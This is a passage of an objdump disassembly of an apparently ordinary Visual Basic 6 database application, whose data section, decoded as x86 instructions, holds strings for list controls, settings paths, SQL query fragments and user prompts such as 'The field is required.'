  4033f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4033f7:	32 00                	xor    (%eax),%al
  4033f9:	00 00                	add    %al,(%eax)
  4033fb:	00 44 65 61          	add    %al,0x61(%ebp,%eiz,2)
  4033ff:	6c                   	insb   (%dx),%es:(%edi)
  403400:	61                   	popa
  403401:	68 6f 79 61 00       	push   $0x61796f
  403406:	00 00                	add    %al,(%eax)
  403408:	9b                   	fwait
  403409:	06                   	push   %es
  40340a:	16                   	push   %ss
  40340b:	82 89 80 b0 4b b1 d0 	orb    $0xd0,-0x4eb44f80(%ecx)
  403412:	02 c2                	add    %dl,%al
  403414:	52                   	push   %edx
  403415:	b3 54                	mov    $0x54,%bl
  403417:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403418:	84 84 eb 97 17 e3 b4 	test   %al,-0x4b1ce869(%ebx,%ebp,8)
  40341f:	49                   	dec    %ecx
  403420:	91                   	xchg   %eax,%ecx
  403421:	80 6d 81 9d          	subb   $0x9d,-0x7f(%ebp)
  403425:	4f                   	dec    %edi
  403426:	10 86 4b 1a 98 c6    	adc    %al,-0x3967e5b5(%esi)
  40342c:	52                   	push   %edx
  40342d:	71 e2                	jno    0x403411
  40342f:	4c                   	dec    %esp
  403430:	9e                   	sahf
  403431:	eb 83                	jmp    0x4033b6
  403433:	11 a3 e1 47 9c 83    	adc    %esp,-0x7c63b81f(%ebx)
  403439:	84 b1 d0 f2 0e c9    	test   %dh,-0x36f10d30(%ecx)
  40343f:	4e                   	dec    %esi
  403440:	b4 4c                	mov    $0x4c,%ah
  403442:	61                   	popa
  403443:	2f                   	das
  403444:	a3 d7 c1 b8 72       	mov    %eax,0x72b8c1d7
  403449:	4f                   	dec    %edi
  40344a:	ad                   	lods   %ds:(%esi),%eax
  40344b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  403451:	0c 00                	or     $0x0,%al
  403453:	aa                   	stos   %al,%es:(%edi)
  403454:	00 60 d3             	add    %ah,-0x2d(%eax)
  403457:	93                   	xchg   %eax,%ebx
  403458:	4d                   	dec    %ebp
  403459:	44                   	inc    %esp
  40345a:	49                   	dec    %ecx
  40345b:	46                   	inc    %esi
  40345c:	6f                   	outsl  %ds:(%esi),(%dx)
  40345d:	72 6d                	jb     0x4034cc
  40345f:	00 2e                	add    %ch,(%esi)
  403461:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  403466:	68 10 a7 38 08       	push   $0x838a710
  40346b:	00 2b                	add    %ch,(%ebx)
  40346d:	33 71 b5             	xor    -0x4b(%ecx),%esi
  403470:	43                   	inc    %ebx
  403471:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  403475:	6f                   	outsl  %ds:(%esi),(%dx)
  403476:	67 72 61             	addr16 jb 0x4034da
  403479:	6d                   	insl   (%dx),%es:(%edi)
  40347a:	20 46 69             	and    %al,0x69(%esi)
  40347d:	6c                   	insb   (%dx),%es:(%edi)
  40347e:	65 73 20             	gs jae 0x4034a1
  403481:	28 78 38             	sub    %bh,0x38(%eax)
  403484:	36 29 5c 4d 69       	sub    %ebx,%ss:0x69(%ebp,%ecx,2)
  403489:	63 72 6f             	arpl   %esi,0x6f(%edx)
  40348c:	73 6f                	jae    0x4034fd
  40348e:	66 74 20             	data16 je 0x4034b1
  403491:	56                   	push   %esi
  403492:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  403499:	74 75                	je     0x403510
  40349b:	64 69 6f 5c 56 42 39 	imul   $0x38394256,%fs:0x5c(%edi),%ebp
  4034a2:	38 
  4034a3:	5c                   	pop    %esp
  4034a4:	56                   	push   %esi
  4034a5:	42                   	inc    %edx
  4034a6:	36 2e 4f             	ss cs dec %edi
  4034a9:	4c                   	dec    %esp
  4034aa:	42                   	inc    %edx
  4034ab:	00 56 42             	add    %dl,0x42(%esi)
  4034ae:	00 00                	add    %al,(%eax)
  4034b0:	60                   	pusha
  4034b1:	34 40                	xor    $0x40,%al
  4034b3:	00 00                	add    %al,(%eax)
  4034b5:	00 00                	add    %al,(%eax)
  4034b7:	00 06                	add    %al,(%esi)
  4034b9:	00 00                	add    %al,(%eax)
  4034bb:	00 09                	add    %cl,(%ecx)
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	00 70 34             	add    %dh,0x34(%eax)
  4034c2:	40                   	inc    %eax
  4034c3:	00 ac 34 40 00 28 75 	add    %ch,0x75280040(%esp,%esi,1)
  4034ca:	40                   	inc    %eax
	...
  4034d3:	00 a0 04 a7 00 0c    	add    %ah,0xc00a704(%eax)
  4034d9:	00 40 00             	add    %al,0x0(%eax)
	...
  4034e4:	0c 00                	or     $0x0,%al
  4034e6:	08 00                	or     %al,(%eax)
	...
  4034f0:	23 3d fb fc fa a0    	and    0xa0fafcfb,%edi
  4034f6:	68 10 a7 38 08       	push   $0x838a710
  4034fb:	00 2b                	add    %ch,(%ebx)
  4034fd:	33 71 b5             	xor    -0x4b(%ecx),%esi
  403500:	22 3d fb fc fa a0    	and    0xa0fafcfb,%bh
  403506:	68 10 a7 38 08       	push   $0x838a710
  40350b:	00 2b                	add    %ch,(%ebx)
  40350d:	33 71 b5             	xor    -0x4b(%ecx),%esi
  403510:	02 00                	add    (%eax),%al
  403512:	00 00                	add    %al,(%eax)
  403514:	f0 34 40             	lock xor $0x40,%al
  403517:	00 00                	add    %al,(%eax)
  403519:	35 40 00 00 00       	xor    $0x40,%eax
  40351e:	00 00                	add    %al,(%eax)
  403520:	56                   	push   %esi
  403521:	42                   	inc    %edx
  403522:	41                   	inc    %ecx
  403523:	36 2e 44             	ss cs inc %esp
  403526:	4c                   	dec    %esp
  403527:	4c                   	dec    %esp
  403528:	00 00                	add    %al,(%eax)
  40352a:	00 00                	add    %al,(%eax)
  40352c:	5f                   	pop    %edi
  40352d:	5f                   	pop    %edi
  40352e:	76 62                	jbe    0x403592
  403530:	61                   	popa
  403531:	46                   	inc    %esi
  403532:	72 65                	jb     0x403599
  403534:	65 4f                	gs dec %edi
  403536:	62 6a 00             	bound  %ebp,0x0(%edx)
  403539:	00 00                	add    %al,(%eax)
  40353b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40353e:	76 62                	jbe    0x4035a2
  403540:	61                   	popa
  403541:	48                   	dec    %eax
  403542:	72 65                	jb     0x4035a9
  403544:	73 75                	jae    0x4035bb
  403546:	6c                   	insb   (%dx),%es:(%edi)
  403547:	74 43                	je     0x40358c
  403549:	68 65 63 6b 4f       	push   $0x4f6b6365
  40354e:	62 6a 00             	bound  %ebp,0x0(%edx)
  403551:	00 00                	add    %al,(%eax)
  403553:	00 5f 5f             	add    %bl,0x5f(%edi)
  403556:	76 62                	jbe    0x4035ba
  403558:	61                   	popa
  403559:	4f                   	dec    %edi
  40355a:	62 6a 53             	bound  %ebp,0x53(%edx)
  40355d:	65 74 41             	gs je  0x4035a1
  403560:	64 64 72 65          	fs fs jb 0x4035c9
  403564:	66 00 00             	data16 add %al,(%eax)
  403567:	00 5f 5f             	add    %bl,0x5f(%edi)
  40356a:	76 62                	jbe    0x4035ce
  40356c:	61                   	popa
  40356d:	4e                   	dec    %esi
  40356e:	65 77 32             	gs ja  0x4035a3
  403571:	00 00                	add    %al,(%eax)
  403573:	00 f0                	add    %dh,%al
  403575:	34 40                	xor    $0x40,%al
  403577:	00 2c 75 40 00 79 4f 	add    %ch,0x4f790040(,%esi,2)
  40357e:	ad                   	lods   %ds:(%esi),%eax
  40357f:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  403585:	0c 00                	or     $0x0,%al
  403587:	aa                   	stos   %al,%es:(%edi)
  403588:	00 60 d3             	add    %ah,-0x2d(%eax)
  40358b:	93                   	xchg   %eax,%ebx
  40358c:	14 00                	adc    $0x0,%al
  40358e:	00 00                	add    %al,(%eax)
  403590:	5c                   	pop    %esp
  403591:	00 53 00             	add    %dl,0x0(%ebx)
  403594:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  403599:	00 69 00             	add    %ch,0x0(%ecx)
  40359c:	6e                   	outsb  %ds:(%esi),(%dx)
  40359d:	00 67 00             	add    %ah,0x0(%edi)
  4035a0:	73 00                	jae    0x4035a2
  4035a2:	5c                   	pop    %esp
  4035a3:	00 00                	add    %al,(%eax)
  4035a5:	00 00                	add    %al,(%eax)
  4035a7:	00 39                	add    %bh,(%ecx)
  4035a9:	4f                   	dec    %edi
  4035aa:	ad                   	lods   %ds:(%esi),%eax
  4035ab:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4035b1:	0c 00                	or     $0x0,%al
  4035b3:	aa                   	stos   %al,%es:(%edi)
  4035b4:	00 60 d3             	add    %ah,-0x2d(%eax)
  4035b7:	93                   	xchg   %eax,%ebx
  4035b8:	08 00                	or     %al,(%eax)
  4035ba:	00 00                	add    %al,(%eax)
  4035bc:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4035c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4035c1:	00 73 00             	add    %dh,0x0(%ebx)
  4035c4:	00 00                	add    %al,(%eax)
  4035c6:	00 00                	add    %al,(%eax)
  4035c8:	04 00                	add    $0x0,%al
  4035ca:	00 00                	add    %al,(%eax)
  4035cc:	01 00                	add    %eax,(%eax)
  4035ce:	8c 0f                	mov    %cs,(%edi)
  4035d0:	04 00                	add    $0x0,%al
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	01 00                	add    %eax,(%eax)
  4035d6:	88 0f                	mov    %cl,(%edi)
	...
  4035e0:	04 00                	add    $0x0,%al
  4035e2:	00 00                	add    %al,(%eax)
  4035e4:	01 00                	add    %eax,(%eax)
  4035e6:	84 00                	test   %al,(%eax)
  4035e8:	4e                   	dec    %esi
  4035e9:	00 61 00             	add    %ah,0x0(%ecx)
  4035ec:	6d                   	insl   (%dx),%es:(%edi)
  4035ed:	00 65 00             	add    %ah,0x0(%ebp)
  4035f0:	00 00                	add    %al,(%eax)
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	08 00                	or     %al,(%eax)
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  4035fc:	69 00 73 00 00 00    	imul   $0x73,(%eax),%eax
  403602:	00 00                	add    %al,(%eax)
  403604:	56                   	push   %esi
  403605:	00 69 00             	add    %ch,0x0(%ecx)
  403608:	73 00                	jae    0x40360a
  40360a:	69 00 62 00 6c 00    	imul   $0x6c0062,(%eax),%eax
  403610:	65 00 00             	add    %al,%gs:(%eax)
  403613:	00 04 00             	add    %al,(%eax,%eax,1)
  403616:	00 00                	add    %al,(%eax)
  403618:	01 00                	add    %eax,(%eax)
  40361a:	8c 00                	mov    %es,(%eax)
  40361c:	41                   	inc    %ecx
  40361d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  403621:	00 67 00             	add    %ah,0x0(%edi)
  403624:	6e                   	outsb  %ds:(%esi),(%dx)
  403625:	00 00                	add    %al,(%eax)
  403627:	00 12                	add    %dl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	00 5c 00 53          	add    %bl,0x53(%eax,%eax,1)
  40362f:	00 65 00             	add    %ah,0x0(%ebp)
  403632:	74 00                	je     0x403634
  403634:	74 00                	je     0x403636
  403636:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40363c:	73 00                	jae    0x40363e
  40363e:	00 00                	add    %al,(%eax)
  403640:	4c                   	dec    %esp
  403641:	00 69 00             	add    %ch,0x0(%ecx)
  403644:	73 00                	jae    0x403646
  403646:	74 00                	je     0x403648
  403648:	49                   	dec    %ecx
  403649:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40364d:	00 6d 00             	add    %ch,0x0(%ebp)
  403650:	73 00                	jae    0x403652
  403652:	00 00                	add    %al,(%eax)
  403654:	43                   	inc    %ebx
  403655:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  403659:	00 61 00             	add    %ah,0x0(%ecx)
  40365c:	72 00                	jb     0x40365e
  40365e:	00 00                	add    %al,(%eax)
  403660:	45                   	inc    %ebp
  403661:	00 4f 00             	add    %cl,0x0(%edi)
  403664:	46                   	inc    %esi
  403665:	00 00                	add    %al,(%eax)
  403667:	00 41 00             	add    %al,0x0(%ecx)
  40366a:	62 00                	bound  %eax,(%eax)
  40366c:	73 00                	jae    0x40366e
  40366e:	6f                   	outsl  %ds:(%esi),(%dx)
  40366f:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  403673:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  403677:	00 50 00             	add    %dl,0x0(%eax)
  40367a:	6f                   	outsl  %ds:(%esi),(%dx)
  40367b:	00 73 00             	add    %dh,0x0(%ebx)
  40367e:	69 00 74 00 69 00    	imul   $0x690074,(%eax),%eax
  403684:	6f                   	outsl  %ds:(%esi),(%dx)
  403685:	00 6e 00             	add    %ch,0x0(%esi)
  403688:	00 00                	add    %al,(%eax)
  40368a:	00 00                	add    %al,(%eax)
  40368c:	41                   	inc    %ecx
  40368d:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  403691:	00 00                	add    %al,(%eax)
  403693:	00 46 00             	add    %al,0x0(%esi)
  403696:	69 00 65 00 6c 00    	imul   $0x6c0065,(%eax),%eax
  40369c:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  4036a0:	00 00                	add    %al,(%eax)
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	53                   	push   %ebx
  4036a5:	00 75 00             	add    %dh,0x0(%ebp)
  4036a8:	62 00                	bound  %eax,(%eax)
  4036aa:	49                   	dec    %ecx
  4036ab:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4036af:	00 6d 00             	add    %ch,0x0(%ebp)
  4036b2:	73 00                	jae    0x4036b4
  4036b4:	00 00                	add    %al,(%eax)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	4d                   	dec    %ebp
  4036b9:	00 6f 00             	add    %ch,0x0(%edi)
  4036bc:	76 00                	jbe    0x4036be
  4036be:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  4036c2:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  4036c6:	74 00                	je     0x4036c8
  4036c8:	00 00                	add    %al,(%eax)
  4036ca:	00 00                	add    %al,(%eax)
  4036cc:	46                   	inc    %esi
  4036cd:	00 69 00             	add    %ch,0x0(%ecx)
  4036d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4036d1:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  4036d5:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4036d9:	00 6d 00             	add    %ch,0x0(%ebp)
  4036dc:	00 00                	add    %al,(%eax)
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	45                   	inc    %ebp
  4036e1:	00 6e 00             	add    %ch,0x0(%esi)
  4036e4:	73 00                	jae    0x4036e6
  4036e6:	75 00                	jne    0x4036e8
  4036e8:	72 00                	jb     0x4036ea
  4036ea:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  4036ee:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  4036f4:	62 00                	bound  %eax,(%eax)
  4036f6:	6c                   	insb   (%dx),%es:(%edi)
  4036f7:	00 65 00             	add    %ah,0x0(%ebp)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	53                   	push   %ebx
  4036fd:	00 65 00             	add    %ah,0x0(%ebp)
  403700:	6c                   	insb   (%dx),%es:(%edi)
  403701:	00 65 00             	add    %ah,0x0(%ebp)
  403704:	63 00                	arpl   %eax,(%eax)
  403706:	74 00                	je     0x403708
  403708:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40370d:	00 00                	add    %al,(%eax)
  40370f:	00 e1                	add    %ah,%cl
  403711:	4e                   	dec    %esi
  403712:	ad                   	lods   %ds:(%esi),%eax
  403713:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  403719:	0c 00                	or     $0x0,%al
  40371b:	aa                   	stos   %al,%es:(%edi)
  40371c:	00 60 d3             	add    %ah,-0x2d(%eax)
  40371f:	93                   	xchg   %eax,%ebx
  403720:	04 00                	add    $0x0,%al
  403722:	00 00                	add    %al,(%eax)
  403724:	0d 00 0a 00 00       	or     $0xa00,%eax
  403729:	00 00                	add    %al,(%eax)
  40372b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40372e:	00 00                	add    %al,(%eax)
  403730:	20 00                	and    %al,(%eax)
  403732:	4f                   	dec    %edi
  403733:	00 52 00             	add    %dl,0x0(%edx)
  403736:	44                   	inc    %esp
  403737:	00 45 00             	add    %al,0x0(%ebp)
  40373a:	52                   	push   %edx
  40373b:	00 20                	add    %ah,(%eax)
  40373d:	00 42 00             	add    %al,0x0(%edx)
  403740:	59                   	pop    %ecx
  403741:	00 20                	add    %ah,(%eax)
  403743:	00 4d 00             	add    %cl,0x0(%ebp)
  403746:	61                   	popa
  403747:	00 78 00             	add    %bh,0x0(%eax)
  40374a:	28 00                	sub    %al,(%eax)
  40374c:	00 00                	add    %al,(%eax)
  40374e:	00 00                	add    %al,(%eax)
  403750:	0c 00                	or     $0x0,%al
  403752:	00 00                	add    %al,(%eax)
  403754:	29 00                	sub    %eax,(%eax)
  403756:	20 00                	and    %al,(%eax)
  403758:	44                   	inc    %esp
  403759:	00 45 00             	add    %al,0x0(%ebp)
  40375c:	53                   	push   %ebx
  40375d:	00 43 00             	add    %al,0x0(%ebx)
  403760:	00 00                	add    %al,(%eax)
  403762:	00 00                	add    %al,(%eax)
  403764:	4f                   	dec    %edi
  403765:	00 70 00             	add    %dh,0x0(%eax)
  403768:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40376c:	00 00                	add    %al,(%eax)
  40376e:	00 00                	add    %al,(%eax)
  403770:	b8 66 c4 a4 9f       	mov    $0x9fa4c466,%eax
  403775:	49                   	dec    %ecx
  403776:	1b 10                	sbb    (%eax),%edx
  403778:	bb 78 00 aa 00       	mov    $0xaa0078,%ebx
  40377d:	38 3c bb             	cmp    %bh,(%ebx,%edi,4)
  403780:	6e                   	outsb  %ds:(%esi),(%dx)
  403781:	00 00                	add    %al,(%eax)
  403783:	00 2a                	add    %ch,(%edx)
  403785:	00 4e 00             	add    %cl,0x0(%esi)
  403788:	6f                   	outsl  %ds:(%esi),(%dx)
  403789:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40378d:	00 3a                	add    %bh,(%edx)
  40378f:	00 20                	add    %ah,(%eax)
  403791:	00 43 00             	add    %al,0x0(%ebx)
  403794:	6f                   	outsl  %ds:(%esi),(%dx)
  403795:	00 6e 00             	add    %ch,0x0(%esi)
  403798:	74 00                	je     0x40379a
  40379a:	61                   	popa
  40379b:	00 63 00             	add    %ah,0x0(%ebx)
  40379e:	74 00                	je     0x4037a0
  4037a0:	20 00                	and    %al,(%eax)
  4037a2:	74 00                	je     0x4037a4
  4037a4:	68 00 65 00 20       	push   $0x20006500
  4037a9:	00 70 00             	add    %dh,0x0(%eax)
  4037ac:	72 00                	jb     0x4037ae
  4037ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4037af:	00 67 00             	add    %ah,0x0(%edi)
  4037b2:	72 00                	jb     0x4037b4
  4037b4:	61                   	popa
  4037b5:	00 6d 00             	add    %ch,0x0(%ebp)
  4037b8:	6d                   	insl   (%dx),%es:(%edi)
  4037b9:	00 65 00             	add    %ah,0x0(%ebp)
  4037bc:	72 00                	jb     0x4037be
  4037be:	20 00                	and    %al,(%eax)
  4037c0:	74 00                	je     0x4037c2
  4037c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c3:	00 20                	add    %ah,(%eax)
  4037c5:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4037c9:	00 61 00             	add    %ah,0x0(%ecx)
  4037cc:	72 00                	jb     0x4037ce
  4037ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4037cf:	00 20                	add    %ah,(%eax)
  4037d1:	00 6d 00             	add    %ch,0x0(%ebp)
  4037d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d5:	00 72 00             	add    %dh,0x0(%edx)
  4037d8:	65 00 20             	add    %ah,%gs:(%eax)
  4037db:	00 61 00             	add    %ah,0x0(%ecx)
  4037de:	62 00                	bound  %eax,(%eax)
  4037e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e1:	00 75 00             	add    %dh,0x0(%ebp)
  4037e4:	74 00                	je     0x4037e6
  4037e6:	20 00                	and    %al,(%eax)
  4037e8:	74 00                	je     0x4037ea
  4037ea:	68 00 69 00 73       	push   $0x73006900
  4037ef:	00 2e                	add    %ch,(%esi)
  4037f1:	00 00                	add    %al,(%eax)
  4037f3:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	43                   	inc    %ebx
  4037f9:	00 53 00             	add    %dl,0x0(%ebx)
  4037fc:	52                   	push   %edx
  4037fd:	00 53 00             	add    %dl,0x0(%ebx)
  403800:	20 00                	and    %al,(%eax)
  403802:	76 00                	jbe    0x403804
  403804:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403808:	73 00                	jae    0x40380a
  40380a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403810:	20 00                	and    %al,(%eax)
  403812:	31 00                	xor    %eax,(%eax)
  403814:	00 00                	add    %al,(%eax)
  403816:	00 00                	add    %al,(%eax)
  403818:	1c 00                	sbb    $0x0,%al
  40381a:	00 00                	add    %al,(%eax)
  40381c:	44                   	inc    %esp
  40381d:	00 65 00             	add    %ah,0x0(%ebp)
  403820:	6c                   	insb   (%dx),%es:(%edi)
  403821:	00 65 00             	add    %ah,0x0(%ebp)
  403824:	74 00                	je     0x403826
  403826:	65 00 20             	add    %ah,%gs:(%eax)
  403829:	00 2a                	add    %ch,(%edx)
  40382b:	00 20                	add    %ah,(%eax)
  40382d:	00 46 00             	add    %al,0x0(%esi)
  403830:	72 00                	jb     0x403832
  403832:	6f                   	outsl  %ds:(%esi),(%dx)
  403833:	00 6d 00             	add    %ch,0x0(%ebp)
  403836:	20 00                	and    %al,(%eax)
  403838:	00 00                	add    %al,(%eax)
  40383a:	00 00                	add    %al,(%eax)
  40383c:	0e                   	push   %cs
  40383d:	00 00                	add    %al,(%eax)
  40383f:	00 20                	add    %ah,(%eax)
  403841:	00 57 00             	add    %dl,0x0(%edi)
  403844:	68 00 65 00 72       	push   $0x72006500
  403849:	00 65 00             	add    %ah,0x0(%ebp)
  40384c:	20 00                	and    %al,(%eax)
  40384e:	00 00                	add    %al,(%eax)
  403850:	04 00                	add    $0x0,%al
  403852:	00 00                	add    %al,(%eax)
  403854:	20 00                	and    %al,(%eax)
  403856:	3d 00 00 00 00       	cmp    $0x0,%eax
  40385b:	00 45 00             	add    %al,0x0(%ebp)
  40385e:	78 00                	js     0x403860
  403860:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403864:	75 00                	jne    0x403866
  403866:	74 00                	je     0x403868
  403868:	65 00 00             	add    %al,%gs:(%eax)
  40386b:	00 06                	add    %al,(%esi)
  40386d:	00 00                	add    %al,(%eax)
  40386f:	00 20                	add    %ah,(%eax)
  403871:	00 3d 00 27 00 00    	add    %bh,0x2700
  403877:	00 02                	add    %al,(%edx)
  403879:	00 00                	add    %al,(%eax)
  40387b:	00 27                	add    %ah,(%edi)
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  403883:	00 78 00             	add    %bh,0x0(%eax)
  403886:	74 00                	je     0x403888
  403888:	00 00                	add    %al,(%eax)
  40388a:	00 00                	add    %al,(%eax)
  40388c:	4c                   	dec    %esp
  40388d:	00 00                	add    %al,(%eax)
  40388f:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  403893:	00 65 00             	add    %ah,0x0(%ebp)
  403896:	20 00                	and    %al,(%eax)
  403898:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40389c:	65 00 6c 00 64       	add    %ch,%gs:0x64(%eax,%eax,1)
  4038a1:	00 20                	add    %ah,(%eax)
  4038a3:	00 69 00             	add    %ch,0x0(%ecx)
  4038a6:	73 00                	jae    0x4038a8
  4038a8:	20 00                	and    %al,(%eax)
  4038aa:	72 00                	jb     0x4038ac
  4038ac:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  4038b0:	75 00                	jne    0x4038b2
  4038b2:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  4038b8:	64 00 2e             	add    %ch,%fs:(%esi)
  4038bb:	00 50 00             	add    %dl,0x0(%eax)
  4038be:	6c                   	insb   (%dx),%es:(%edi)
  4038bf:	00 65 00             	add    %ah,0x0(%ebp)
  4038c2:	61                   	popa
  4038c3:	00 73 00             	add    %dh,0x0(%ebx)
  4038c6:	65 00 20             	add    %ah,%gs:(%eax)
  4038c9:	00 63 00             	add    %ah,0x0(%ebx)
  4038cc:	68 00 65 00 63       	push   $0x63006500
  4038d1:	00 6b 00             	add    %ch,0x0(%ebx)
  4038d4:	20 00                	and    %al,(%eax)
  4038d6:	69 00 74 00 21 00    	imul   $0x210074,(%eax),%eax
  4038dc:	00 00                	add    %al,(%eax)
  4038de:	00 00                	add    %al,(%eax)
  4038e0:	53                   	push   %ebx
  4038e1:	00 65 00             	add    %ah,0x0(%ebp)
  4038e4:	74 00                	je     0x4038e6
  4038e6:	46                   	inc    %esi
  4038e7:	00 6f 00             	add    %ch,0x0(%edi)
  4038ea:	63 00                	arpl   %eax,(%eax)
  4038ec:	75 00                	jne    0x4038ee
  4038ee:	73 00                	jae    0x4038f0
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	00 00                	add    %al,(%eax)
  4038f4:	16                   	push   %ss
  4038f5:	00 00                	add    %al,(%eax)
  4038f7:	00 53 00             	add    %dl,0x0(%ebx)
  4038fa:	45                   	inc    %ebp
  4038fb:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4038ff:	00 43 00             	add    %al,0x0(%ebx)
  403902:	54                   	push   %esp
  403903:	00 20                	add    %ah,(%eax)
  403905:	00 4d 00             	add    %cl,0x0(%ebp)
  403908:	61                   	popa
  403909:	00 78 00             	add    %bh,0x0(%eax)
  40390c:	28 00                	sub    %al,(%eax)
  40390e:	00 00                	add    %al,(%eax)
  403910:	02 00                	add    (%eax),%al
  403912:	00 00                	add    %al,(%eax)
  403914:	2e 00 00             	add    %al,%cs:(%eax)
  403917:	00 26                	add    %ah,(%esi)
  403919:	00 00                	add    %al,(%eax)
  40391b:	00 29                	add    %ch,(%ecx)
  40391d:	00 20                	add    %ah,(%eax)
  40391f:	00 41 00             	add    %al,0x0(%ecx)
  403922:	53                   	push   %ebx
  403923:	00 20                	add    %ah,(%eax)
  403925:	00 5b 00             	add    %bl,0x0(%ebx)
  403928:	4e                   	dec    %esi
  403929:	00 75 00             	add    %dh,0x0(%ebp)
  40392c:	6d                   	insl   (%dx),%es:(%edi)
  40392d:	00 62 00             	add    %ah,0x0(%edx)
  403930:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403934:	5d                   	pop    %ebp
  403935:	00 20                	add    %ah,(%eax)
  403937:	00 46 00             	add    %al,0x0(%esi)
  40393a:	72 00                	jb     0x40393c
  40393c:	6f                   	outsl  %ds:(%esi),(%dx)
  40393d:	00 6d 00             	add    %ch,0x0(%ebp)
  403940:	20 00                	and    %al,(%eax)
  403942:	00 00                	add    %al,(%eax)
  403944:	00 00                	add    %al,(%eax)
  403946:	00 00                	add    %al,(%eax)
  403948:	52                   	push   %edx
  403949:	00 65 00             	add    %ah,0x0(%ebp)
  40394c:	63 00                	arpl   %eax,(%eax)
  40394e:	6f                   	outsl  %ds:(%esi),(%dx)
  40394f:	00 72 00             	add    %dh,0x0(%edx)
  403952:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  403956:	6f                   	outsl  %ds:(%esi),(%dx)
  403957:	00 75 00             	add    %dh,0x0(%ebp)
  40395a:	6e                   	outsb  %ds:(%esi),(%dx)
  40395b:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40395f:	00 60 00             	add    %ah,0x0(%eax)
  403962:	00 00                	add    %al,(%eax)
  403964:	54                   	push   %esp
  403965:	00 68 00             	add    %ch,0x0(%eax)
  403968:	65 00 20             	add    %ah,%gs:(%eax)
  40396b:	00 61 00             	add    %ah,0x0(%ecx)
  40396e:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  403973:	00 6e 00             	add    %ch,0x0(%esi)
  403976:	67 00 20             	add    %ah,(%bx,%si)
  403979:	00 6f 00             	add    %ch,0x0(%edi)
  40397c:	66 00 20             	data16 add %ah,(%eax)
  40397f:	00 6e 00             	add    %ch,0x0(%esi)
  403982:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  403986:	20 00                	and    %al,(%eax)
  403988:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40398c:	74 00                	je     0x40398e
  40398e:	72 00                	jb     0x403990
  403990:	79 00                	jns    0x403992
  403992:	20 00                	and    %al,(%eax)
  403994:	63 00                	arpl   %eax,(%eax)
  403996:	61                   	popa
  403997:	00 6e 00             	add    %ch,0x0(%esi)
  40399a:	6e                   	outsb  %ds:(%esi),(%dx)
  40399b:	00 6f 00             	add    %ch,0x0(%edi)
  40399e:	74 00                	je     0x4039a0
  4039a0:	20 00                	and    %al,(%eax)
  4039a2:	62 00                	bound  %eax,(%eax)
  4039a4:	65 00 20             	add    %ah,%gs:(%eax)
  4039a7:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
